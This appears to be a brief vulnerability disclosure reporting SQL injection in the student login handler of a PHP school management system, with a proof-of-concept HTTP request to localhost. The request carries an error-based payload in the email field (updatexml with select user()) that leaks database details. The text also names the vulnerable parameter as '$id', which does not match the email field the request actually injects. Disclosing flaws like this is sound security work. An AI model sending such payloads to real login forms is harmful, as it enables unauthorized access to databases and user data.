# SQL Injection Vulnerability at student_login.process.php

There is a SQL Injection Vulnerability at `student_login.process.php`.When a student try to login in to the student dashboard.There is a SQL Injection Vulnerability at the param `$id`

The Vulnerabilty Loation is bellow.

<img width="680" alt="11" src="https://user-images.githubusercontent.com/44317939/202435903-6387df2b-4f37-4a60-90c1-1645a6d5a228.png">


Here is the PoC

```bash
POST /tms/processes/student_login.process.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 71
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/tms/login_stud.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=ddd'and 1=(updatexml(1,concat(0x3a,(select user())),1))--+&pwd=dd
```

<img width="926" alt="222" src="https://user-images.githubusercontent.com/44317939/202435970-265b375c-a22f-48e8-b8e6-5d6dda14da7d.png">
